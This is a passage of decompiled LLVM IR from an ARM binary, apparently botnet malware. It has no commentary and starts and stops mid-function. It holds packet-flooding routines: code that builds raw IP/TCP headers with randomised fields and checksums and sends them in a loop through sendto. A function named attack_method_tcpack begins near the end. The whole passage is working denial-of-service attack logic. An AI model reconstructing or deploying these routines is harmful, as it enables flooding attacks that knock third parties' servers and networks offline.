  %v3_b88c = load i32, i32* %v2_b88c, align 4
  store i32 %v3_b88c, i32* %r1.global-to-local, align 4
  %v2_b890 = load i32, i32* @r4, align 4
  %v3_b890 = add i32 %v2_b890, 20
  %v4_b890 = inttoptr i32 %v3_b890 to i16*
  store i16 %v3_b888, i16* %v4_b890, align 2
  %v0_b894 = load i32, i32* @r4, align 4
  %v1_b894 = add i32 %v0_b894, 20
  store i32 %v1_b894, i32* @r8, align 4
  %v1_b898 = add i32 %v0_b894, 33
  %v2_b898 = inttoptr i32 %v1_b898 to i8*
  %v3_b898 = load i8, i8* %v2_b898, align 1
  %v4_b898 = zext i8 %v3_b898 to i32
  store i32 %v4_b898, i32* %r2.global-to-local, align 4
  %v0_b89c = load i32, i32* %r1.global-to-local, align 4
  %v2_b89c = add i32 %v0_b894, 24
  %v3_b89c = inttoptr i32 %v2_b89c to i32*
  store i32 %v0_b89c, i32* %v3_b89c, align 4
  %v0_b8a0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b8a0 = or i32 %v0_b8a0, 1
  store i32 %v1_b8a0, i32* %r2.global-to-local, align 4
  %v0_b8a4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b8a4 = add i32 %v0_b8a4, 4
  %v2_b8a4 = inttoptr i32 %v1_b8a4 to i32*
  %v3_b8a4 = load i32, i32* %v2_b8a4, align 4
  store i32 %v3_b8a4, i32* %r1.global-to-local, align 4
  %v1_b8a8 = add i32 %v0_b8a4, 14
  %v2_b8a8 = inttoptr i32 %v1_b8a8 to i16*
  %v3_b8a8 = load i16, i16* %v2_b8a8, align 2
  %v4_b8a8 = zext i16 %v3_b8a8 to i32
  store i32 %v4_b8a8, i32* %r3.global-to-local, align 4
  %v1_b8ac = trunc i32 %v1_b8a0 to i8
  %v2_b8ac = load i32, i32* @r8, align 4
  %v3_b8ac = add i32 %v2_b8ac, 13
  %v4_b8ac = inttoptr i32 %v3_b8ac to i8*
  store i8 %v1_b8ac, i8* %v4_b8ac, align 1
  %v0_b8b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b8b0 = trunc i32 %v0_b8b0 to i16
  %v2_b8b0 = load i32, i32* @r8, align 4
  %v3_b8b0 = add i32 %v2_b8b0, 2
  %v4_b8b0 = inttoptr i32 %v3_b8b0 to i16*
  store i16 %v1_b8b0, i16* %v4_b8b0, align 2
  %v0_b8b4 = load i32, i32* @r8, align 4
  %v1_b8b4 = add i32 %v0_b8b4, 12
  %v2_b8b4 = inttoptr i32 %v1_b8b4 to i8*
  %v3_b8b4 = load i8, i8* %v2_b8b4, align 1
  %v4_b8b4 = zext i8 %v3_b8b4 to i32
  store i32 %v4_b8b4, i32* %r3.global-to-local, align 4
  %v1_b8b8 = add i32 %v0_b8b4, 13
  %v2_b8b8 = inttoptr i32 %v1_b8b8 to i8*
  %v3_b8b8 = load i8, i8* %v2_b8b8, align 1
  %v4_b8b8 = zext i8 %v3_b8b8 to i32
  %tmp104 = urem i8 %v3_b8b4, 16
  %v1_b8bc = zext i8 %tmp104 to i32
  %v1_b8c0 = or i32 %v1_b8bc, 128
  store i32 %v1_b8c0, i32* %r3.global-to-local, align 4
  %v1_b8c4 = or i32 %v4_b8b8, 16
  store i32 %v1_b8c4, i32* %r2.global-to-local, align 4
  %v0_b8c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_b8c8 = add i32 %v0_b8b4, 8
  %v3_b8c8 = inttoptr i32 %v2_b8c8 to i32*
  store i32 %v0_b8c8, i32* %v3_b8c8, align 4
  %v0_b8cc = load i32, i32* %r3.global-to-local, align 4
  %v1_b8cc = trunc i32 %v0_b8cc to i8
  %v2_b8cc = load i32, i32* @r8, align 4
  %v3_b8cc = add i32 %v2_b8cc, 12
  %v4_b8cc = inttoptr i32 %v3_b8cc to i8*
  store i8 %v1_b8cc, i8* %v4_b8cc, align 1
  %v0_b8d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b8d0 = trunc i32 %v0_b8d0 to i8
  %v2_b8d0 = load i32, i32* @r8, align 4
  %v3_b8d0 = add i32 %v2_b8d0, 13
  %v4_b8d0 = inttoptr i32 %v3_b8d0 to i8*
  store i8 %v1_b8d0, i8* %v4_b8d0, align 1
  %v0_b8d4 = call i32 @rand_next()
  %v1_b8d4 = trunc i32 %v0_b8d4 to i16
  store i32 %v0_b8d4, i32* %r0.global-to-local, align 4
  store i32 %v1_b418, i32* %r1.global-to-local, align 4
  %v0_b8dc = load i32, i32* @r8, align 4
  %v1_b8dc = add i32 %v0_b8dc, 13
  %v2_b8dc = inttoptr i32 %v1_b8dc to i8*
  %v3_b8dc = load i8, i8* %v2_b8dc, align 1
  %v4_b8dc = zext i8 %v3_b8dc to i32
  store i32 %v1_b8e0, i32* %r2.global-to-local, align 4
  %v1_b8e4 = and i32 %v4_b8dc, 223
  %v5_b8e8 = or i32 %v1_b8e4, %v4_b8e8
  store i32 %v5_b8e8, i32* %r3.global-to-local, align 4
  %v1_b8ec = trunc i32 %v5_b8e8 to i8
  store i8 %v1_b8ec, i8* %v2_b8dc, align 1
  store i32 %v1_b438, i32* %ip.global-to-local, align 4
  %v0_b8f4 = load i32, i32* @r8, align 4
  %v1_b8f4 = add i32 %v0_b8f4, 13
  %v2_b8f4 = inttoptr i32 %v1_b8f4 to i8*
  %v3_b8f4 = load i8, i8* %v2_b8f4, align 1
  %v4_b8f4 = zext i8 %v3_b8f4 to i32
  store i32 %v1_b8f8, i32* %r3.global-to-local, align 4
  %v1_b8fc = and i32 %v4_b8f4, 239
  %v5_b900 = or i32 %v1_b8fc, %v4_b900
  store i32 %v5_b900, i32* %r2.global-to-local, align 4
  %v1_b904 = trunc i32 %v5_b900 to i8
  store i8 %v1_b904, i8* %v2_b8f4, align 1
  store i32 %v1_b458, i32* %r1.global-to-local, align 4
  %v0_b90c = load i32, i32* @r8, align 4
  %v1_b90c = add i32 %v0_b90c, 13
  %v2_b90c = inttoptr i32 %v1_b90c to i8*
  %v3_b90c = load i8, i8* %v2_b90c, align 1
  %v4_b90c = zext i8 %v3_b90c to i32
  store i32 %v1_b910, i32* %r2.global-to-local, align 4
  %v1_b914 = and i32 %v4_b90c, 247
  %v5_b918 = or i32 %v1_b914, %v4_b918
  store i32 %v5_b918, i32* %r3.global-to-local, align 4
  %v1_b91c = trunc i32 %v5_b918 to i8
  store i8 %v1_b91c, i8* %v2_b90c, align 1
  store i32 %v1_b478, i32* %ip.global-to-local, align 4
  %v0_b924 = load i32, i32* @r8, align 4
  %v1_b924 = add i32 %v0_b924, 13
  %v2_b924 = inttoptr i32 %v1_b924 to i8*
  %v3_b924 = load i8, i8* %v2_b924, align 1
  %v4_b924 = zext i8 %v3_b924 to i32
  store i32 %v1_b928, i32* %r3.global-to-local, align 4
  %v1_b92c = and i32 %v4_b924, 251
  %v5_b930 = or i32 %v1_b92c, %v4_b930
  store i32 %v5_b930, i32* %r2.global-to-local, align 4
  %v1_b934 = trunc i32 %v5_b930 to i8
  store i8 %v1_b934, i8* %v2_b924, align 1
  store i32 %v1_b498, i32* %r1.global-to-local, align 4
  %v0_b93c = load i32, i32* @r8, align 4
  %v1_b93c = add i32 %v0_b93c, 13
  %v2_b93c = inttoptr i32 %v1_b93c to i8*
  %v3_b93c = load i8, i8* %v2_b93c, align 1
  %v4_b93c = zext i8 %v3_b93c to i32
  store i32 %v1_b940, i32* %r2.global-to-local, align 4
  %v1_b944 = and i32 %v4_b93c, 253
  %v4_b948 = or i32 %v1_b944, %v3_b948
  store i32 %v4_b948, i32* %r3.global-to-local, align 4
  %v1_b94c = trunc i32 %v4_b948 to i8
  store i8 %v1_b94c, i8* %v2_b93c, align 1
  store i32 %v1_b4b8, i32* %ip.global-to-local, align 4
  %v0_b954 = load i32, i32* @r8, align 4
  %v1_b954 = add i32 %v0_b954, 13
  %v2_b954 = inttoptr i32 %v1_b954 to i8*
  %v3_b954 = load i8, i8* %v2_b954, align 1
  %v4_b954 = zext i8 %v3_b954 to i32
  %v1_b95c = and i32 %v4_b954, 254
  store i32 %v1_b95c, i32* %r2.global-to-local, align 4
  %v2_b960 = or i32 %v1_b95c, %v1_b958
  store i32 %v2_b960, i32* %r3.global-to-local, align 4
  %v1_b964 = trunc i32 %v2_b960 to i8
  store i8 %v1_b964, i8* %v2_b954, align 1
  %v3_b968 = load i32, i32* @r8, align 4
  %v4_b968 = add i32 %v3_b968, 14
  %v5_b968 = inttoptr i32 %v4_b968 to i16*
  store i16 %v1_b8d4, i16* %v5_b968, align 2
  store i32 %v6_b4d0, i32* %r1.global-to-local, align 4
  %v0_b970 = load i32, i32* @r4, align 4
  %v1_b970 = add i32 %v0_b970, 40
  store i32 %v1_b970, i32* %r0.global-to-local, align 4
  %v2_b974 = inttoptr i32 %v1_b970 to i16*
  %v3_b974 = call i32 @rand_str(i16* %v2_b974, i32 %v6_b4d0)
  store i32 %v3_b974, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b6c8

dec_label_pc_b97c:                                ; preds = %dec_label_pc_b53c
  store i32 %v6_b4d0, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_b4d0, 40
  br label %dec_label_pc_b98c

dec_label_pc_b98c:                                ; preds = %dec_label_pc_b6dc, %dec_label_pc_b97c
  %storemerge6.pre-phi = phi i32 [ %v1_b7cc, %dec_label_pc_b6dc ], [ %.pre, %dec_label_pc_b97c ]
  %v0_b9a026 = phi i32 [ %v1_b6d0, %dec_label_pc_b6dc ], [ 0, %dec_label_pc_b97c ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_b4d0, 65536
  %storemerge = add i32 %v6_b4d0, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_b98c = add i32 %storemerge4, 1310720
  store i32 %v1_b98c, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_b98c, 256
  %v3_b994 = and i32 %tmp83, 65280
  store i32 %v3_b994, i32* %r3.global-to-local, align 4
  %v4_b998 = udiv i32 %v1_b98c, 16777216
  %v5_b998 = or i32 %v3_b994, %v4_b998
  store i32 %v5_b998, i32* @r8, align 4
  %v2_bac4 = icmp eq i32 %v1_b4f0, 0
  br label %dec_label_pc_b99c

dec_label_pc_b99c:                                ; preds = %dec_label_pc_b99c, %dec_label_pc_baa8, %dec_label_pc_b98c
  %v0_b9a0 = phi i32 [ %v0_b9a026, %dec_label_pc_b98c ], [ 0, %dec_label_pc_baa8 ], [ 0, %dec_label_pc_b99c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b9a0 = icmp eq i32 %v0_b9a0, 0
  store i1 %v2_b9a0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b9a0, label %dec_label_pc_b99c, label %dec_label_pc_b9ac

dec_label_pc_b9ac:                                ; preds = %dec_label_pc_b99c, %dec_label_pc_baa8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b9b0

dec_label_pc_b9b0:                                ; preds = %dec_label_pc_b9d8, %dec_label_pc_b9ac
  %v1_b9b8 = phi i32 [ %v1_ba98, %dec_label_pc_b9d8 ], [ 0, %dec_label_pc_b9ac ]
  store i32 %v2_b35c, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_b9b8 = mul i32 %v1_b9b8, 4
  %v5_b9b8 = add i32 %v4_b9b8, %v2_b35c
  %v6_b9b8 = inttoptr i32 %v5_b9b8 to i32*
  %v7_b9b8 = load i32, i32* %v6_b9b8, align 4
  store i32 %v7_b9b8, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b9c0 = load i32, i32* @fp, align 4
  %v9_b9c0 = icmp eq i32 %v0_b9c0, 65535
  store i1 %v9_b9c0, i1* %cpsr_z.global-to-local, align 1
  %v1_b9c4 = add i32 %v7_b9b8, 20
  store i32 %v1_b9c4, i32* @r5, align 4
  br i1 %v9_b9c0, label %dec_label_pc_babc, label %dec_label_pc_b9cc

dec_label_pc_b9cc:                                ; preds = %dec_label_pc_b9b0
  store i32 %v1_b4f0, i32* %r3.global-to-local, align 4
  store i1 %v2_bac4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_bac4, label %dec_label_pc_b9d8, label %dec_label_pc_bad0

dec_label_pc_b9d8:                                ; preds = %dec_label_pc_b9cc, %dec_label_pc_babc, %dec_label_pc_bad0
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_b9dc = load i32, i32* @r4, align 4
  %v3_b9dc = add i32 %v2_b9dc, 10
  %v4_b9dc = inttoptr i32 %v3_b9dc to i16*
  store i16 0, i16* %v4_b9dc, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b9e4 = load i32, i32* @r4, align 4
  store i32 %v0_b9e4, i32* @r0, align 4
  %v2_b9e8 = call i32 @checksum_generic(i32 %v0_b9e4, i32 20)
  %v3_b9e8 = trunc i32 %v2_b9e8 to i16
  store i32 %v2_b9e8, i32* %r0.global-to-local, align 4
  %v3_b9ec = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_b34c, i32* %r2.global-to-local, align 4
  %v3_b9f4 = mul i32 %v3_b9ec, 16
  %v2_b9f8 = add i32 %v3_b9f4, %v2_b34c
  store i32 %v2_b9f8, i32* %r1.global-to-local, align 4
  %v1_b9fc = add i32 %v2_b9f8, 4
  %v2_b9fc = inttoptr i32 %v1_b9fc to i32*
  %v3_b9fc = load i32, i32* %v2_b9fc, align 4
  %v3_ba00 = mul i32 %v3_b9fc, 65536
  store i32 %v3_ba00, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_b9fc, 256
  %v1_ba08 = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_b9fc, 256
  %v4_ba0c = urem i32 %tmp86, 256
  %v5_ba0c = or i32 %v4_ba0c, %v1_ba08
  store i32 %v5_ba0c, i32* %r3.global-to-local, align 4
  %v1_ba10 = add i32 %v3_b9fc, 1
  store i32 %v1_ba10, i32* %r2.global-to-local, align 4
  store i32 %v1_ba10, i32* %v2_b9fc, align 4
  %v0_ba18 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba18 = load i32, i32* @r5, align 4
  %v2_ba18 = add i32 %v1_ba18, 4
  %v3_ba18 = inttoptr i32 %v2_ba18 to i32*
  store i32 %v0_ba18, i32* %v3_ba18, align 4
  %v0_ba1c = load i32, i32* %r1.global-to-local, align 4
  %v1_ba1c = add i32 %v0_ba1c, 8
  %v2_ba1c = inttoptr i32 %v1_ba1c to i32*
  %v3_ba1c = load i32, i32* %v2_ba1c, align 4
  %tmp87 = mul i32 %v3_ba1c, 256
  %v1_ba28 = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_ba1c, 256
  %v4_ba2c = urem i32 %tmp88, 256
  %v5_ba2c = or i32 %v4_ba2c, %v1_ba28
  %v1_ba30 = load i32, i32* @r5, align 4
  %v2_ba30 = add i32 %v1_ba30, 8
  %v3_ba30 = inttoptr i32 %v2_ba30 to i32*
  store i32 %v5_ba2c, i32* %v3_ba30, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_ba38 = load i32, i32* @r4, align 4
  %v4_ba38 = add i32 %v3_ba38, 10
  %v5_ba38 = inttoptr i32 %v4_ba38 to i16*
  store i16 %v3_b9e8, i16* %v5_ba38, align 2
  %v0_ba3c = load i32, i32* @r5, align 4
  store i32 %v0_ba3c, i32* @r1, align 4
  %v0_ba40 = load i32, i32* %r3.global-to-local, align 4
  %v1_ba40 = trunc i32 %v0_ba40 to i16
  %v3_ba40 = add i32 %v0_ba3c, 16
  %v4_ba40 = inttoptr i32 %v3_ba40 to i16*
  store i16 %v1_ba40, i16* %v4_ba40, align 2
  %v0_ba44 = load i32, i32* @r8, align 4
  store i32 %v0_ba44, i32* %r2.global-to-local, align 4
  %v0_ba48 = load i32, i32* @sl, align 4
  store i32 %v0_ba48, i32* %r3.global-to-local, align 4
  %v0_ba4c = load i32, i32* @r4, align 4
  store i32 %v0_ba4c, i32* %r0.global-to-local, align 4
  %v4_ba50 = call i32 @checksum_tcpudp(i32 %v0_ba4c, i32 %v0_ba3c, i32 %v0_ba44, i32 %v0_ba48)
  %v5_ba50 = trunc i32 %v4_ba50 to i16
  store i32 %v4_ba50, i32* %r0.global-to-local, align 4
  %v3_ba54 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ba54, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_ba5c = mul i32 %v3_ba54, 32
  store i32 %v3_ba5c, i32* %lr.global-to-local, align 4
  %v3_ba60 = load i32, i32* @r5, align 4
  %v4_ba60 = add i32 %v3_ba60, 16
  %v5_ba60 = inttoptr i32 %v4_ba60 to i16*
  store i16 %v5_ba50, i16* %v5_ba60, align 2
  %v0_ba64 = load i32, i32* %lr.global-to-local, align 4
  %v1_ba64 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_ba64, -8
  %v5_ba64 = add i32 %v0_ba64, %tmp105
  store i32 %v5_ba64, i32* %lr.global-to-local, align 4
  %v0_ba68 = load i32, i32* @r5, align 4
  %v1_ba68 = add i32 %v0_ba68, 2
  %v2_ba68 = inttoptr i32 %v1_ba68 to i16*
  %v3_ba68 = load i16, i16* %v2_ba68, align 2
  %v4_ba68 = zext i16 %v3_ba68 to i32
  store i32 %v4_ba68, i32* @r5, align 4
  %v1_ba6c = load i32, i32* %ip.global-to-local, align 4
  %v2_ba6c = add i32 %v1_ba6c, %v5_ba64
  store i32 %v2_ba6c, i32* @lr, align 4
  %v3_ba70 = add i32 %v2_ba6c, 2
  %v4_ba70 = inttoptr i32 %v3_ba70 to i16*
  store i16 %v3_ba68, i16* %v4_ba70, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_ba7c = load i32, i32* @r4, align 4
  store i32 %v0_ba7c, i32* %r1.global-to-local, align 4
  %v0_ba80 = load i32, i32* @sb, align 4
  store i32 %v0_ba80, i32* %r0.global-to-local, align 4
  %v0_ba84 = load i32, i32* @r7, align 4
  store i32 %v0_ba84, i32* %r2.global-to-local, align 4
  %v0_ba88 = load i32, i32* @lr, align 4
  %v6_ba90 = call i32 @__libc_sendto(i32 %v0_ba80, i32 %v0_ba7c, i32 %v0_ba84, i32 16384, i32 %v0_ba88, i32 16)
  %v3_ba94 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_ba94, i32* %r3.global-to-local, align 4
  %v1_ba98 = add i32 %v3_ba94, 1
  store i32 %v1_ba98, i32* %r0.global-to-local, align 4
  %v0_ba9c = load i32, i32* @r6, align 4
  %v9_ba9c = icmp eq i32 %v0_ba9c, %v1_ba98
  store i1 %v9_ba9c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_ba98, i32* %stack_var_-44, align 4
  %v8_baa4 = icmp sgt i32 %v0_ba9c, %v1_ba98
  br i1 %v8_baa4, label %dec_label_pc_b9b0, label %dec_label_pc_baa8

dec_label_pc_baa8:                                ; preds = %dec_label_pc_b9d8
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_baac = icmp eq i32 %v0_ba9c, 0
  store i1 %v2_baac, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_baac, label %dec_label_pc_b99c, label %dec_label_pc_b9ac

dec_label_pc_babc:                                ; preds = %dec_label_pc_b9b0
  %v0_babc = call i32 @rand_next()
  %v1_babc = trunc i32 %v0_babc to i16
  store i32 %v0_babc, i32* %r0.global-to-local, align 4
  store i32 %v1_b4f0, i32* %r3.global-to-local, align 4
  store i1 %v2_bac4, i1* %cpsr_z.global-to-local, align 1
  %v3_bac8 = load i32, i32* @r4, align 4
  %v4_bac8 = add i32 %v3_bac8, 4
  %v5_bac8 = inttoptr i32 %v4_bac8 to i16*
  store i16 %v1_babc, i16* %v5_bac8, align 2
  br i1 %v2_bac4, label %dec_label_pc_b9d8, label %dec_label_pc_babc.dec_label_pc_bad0_crit_edge

dec_label_pc_babc.dec_label_pc_bad0_crit_edge:    ; preds = %dec_label_pc_babc
  %v0_bad0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_bad0

dec_label_pc_bad0:                                ; preds = %dec_label_pc_babc.dec_label_pc_bad0_crit_edge, %dec_label_pc_b9cc
  %v0_bad0 = phi i32 [ %v0_bad0.pre, %dec_label_pc_babc.dec_label_pc_bad0_crit_edge ], [ %v7_b9b8, %dec_label_pc_b9cc ]
  %v1_bad0 = add i32 %v0_bad0, 40
  store i32 %v1_bad0, i32* %r0.global-to-local, align 4
  store i32 %v6_b4d0, i32* %r1.global-to-local, align 4
  %v2_bad8 = inttoptr i32 %v1_bad0 to i16*
  %v3_bad8 = call i32 @rand_str(i16* %v2_bad8, i32 %v6_b4d0)
  store i32 %v3_bad8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b9d8

; uselistorder directives
  uselistorder i32 %v0_babc, { 1, 0 }
  uselistorder i32 %v1_ba98, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_ba64, { 1, 0 }
  uselistorder i32 %v4_ba50, { 1, 0 }
  uselistorder i32 %v3_ba1c, { 1, 0 }
  uselistorder i32 %v3_b9fc, { 3, 2, 0, 1 }
  uselistorder i32 %v2_b9e8, { 1, 0 }
  uselistorder i1 %v2_bac4, { 2, 3, 1, 0 }
  uselistorder i32 %v0_b8d4, { 1, 0 }
  uselistorder i32 %v0_b80c, { 1, 0 }
  uselistorder i32 %v5_b7a0, { 1, 0 }
  uselistorder i32 %v0_b760, { 1, 0 }
  uselistorder i32 %v0_b71c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_b6cc, { 1, 0, 2, 3 }
  uselistorder i32 %v3_b6b8, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_b644, { 1, 0 }
  uselistorder i32 %v6_b63c, { 0, 2, 1, 3 }
  uselistorder i1 %v9_b66c, { 1, 0 }
  uselistorder i32 %v4_b680, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_b5c8, { 1, 0, 2 }
  uselistorder i32 %v0_b778, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_b5b8, { 1, 0 }
  uselistorder i1 %v7_b5b0, { 1, 0, 2 }
  uselistorder i1 %v7_b564, { 1, 0 }
  uselistorder i32 %v3_b560, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_b940, { 1, 0 }
  uselistorder i32 %v1_b928, { 1, 0 }
  uselistorder i32 %v1_b910, { 1, 0 }
  uselistorder i32 %v1_b8f8, { 1, 0 }
  uselistorder i32 %v1_b8e0, { 1, 0 }
  uselistorder i32 %v3_b678, { 1, 0 }
  uselistorder i1 %v2_b694, { 1, 0 }
  uselistorder i32 %v1_b690, { 1, 0 }
  uselistorder i32 %v4_b68c, { 2, 0, 1 }
  uselistorder i32 %v2_b5a0, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_b53c, { 1, 0 }
  uselistorder i1 %v7_b534, { 1, 0 }
  uselistorder i1 %v7_b508, { 1, 0 }
  uselistorder i32 %v3_b504, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_b4f0, { 2, 3, 1, 0 }
  uselistorder i32 %v6_b4d0, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_b4b8, { 1, 0 }
  uselistorder i32 %v1_b498, { 1, 0 }
  uselistorder i32 %v1_b478, { 1, 0 }
  uselistorder i32 %v1_b458, { 1, 0 }
  uselistorder i32 %v1_b438, { 1, 0 }
  uselistorder i32 %v1_b418, { 1, 0 }
  uselistorder i32 %v6_b3f4, { 1, 0 }
  uselistorder i32 %v1_b3dc, { 1, 0 }
  uselistorder i8 %v5_b394, { 1, 0 }
  uselistorder i32 %v6_b374, { 1, 0 }
  uselistorder i32 %v2_b35c, { 0, 3, 1, 2 }
  uselistorder i32 %v2_b34c, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45, 47, 46, 48, 50, 49, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 11, 10, 16, 12, 13, 14, 15, 19, 17, 18, 21, 20, 22, 25, 24, 23, 26, 27, 28, 30, 31, 29, 32, 34, 33, 35, 36, 37, 39, 38, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 32, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 23, 15, 16, 13, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b9d8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b9ac, { 1, 0 }
  uselistorder label %dec_label_pc_b99c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b98c, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_b6f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b6c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b604, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_b5e4, { 1, 0 }
  uselistorder label %dec_label_pc_b5c0, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_b570, { 1, 0 }
  uselistorder label %dec_label_pc_b554, { 1, 0 }
}

define i32 @attack_method_tcpack(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %v24_bae4 = load i32, i32* @fp, align 4
  %v27_bae4 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  %v2_bb00 = call i32 @calloc(i32 %arg1, i32 4)
  %v0_bb04 = load i32, i32* @r5, align 4
  store i32 %v0_bb04, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_bb14 = load i32, i32* @r4, align 4
  store i32 %v0_bb14, i32* %r0.global-to-local, align 4
  %v5_bb18 = inttoptr i32 %v0_bb04 to i32*
  %v6_bb18 = call i32 @attack_get_opt_int(i32 %v0_bb14, i32* %v5_bb18, i32 2, i32 0)
  %v1_bb24 = urem i32 %v6_bb18, 256
  store i32 %v1_bb24, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_bb30 = load i32, i32* @r5, align 4
  store i32 %v0_bb30, i32* %r1.global-to-local, align 4
  %v0_bb34 = load i32, i32* @r4, align 4
  store i32 %v0_bb34, i32* %r0.global-to-local, align 4
  %v6_bb3c = inttoptr i32 %v0_bb30 to i32*
  %v7_bb3c = call i32 @attack_get_opt_int(i32 %v0_bb34, i32* %v6_bb3c, i32 3, i32 65535)
  %v0_bb40 = load i32, i32* @r5, align 4
  store i32 %v0_bb40, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_bb3c, i32* @sb, align 4
  %v0_bb50 = load i32, i32* @r4, align 4
  store i32 %v0_bb50, i32* %r0.global-to-local, align 4
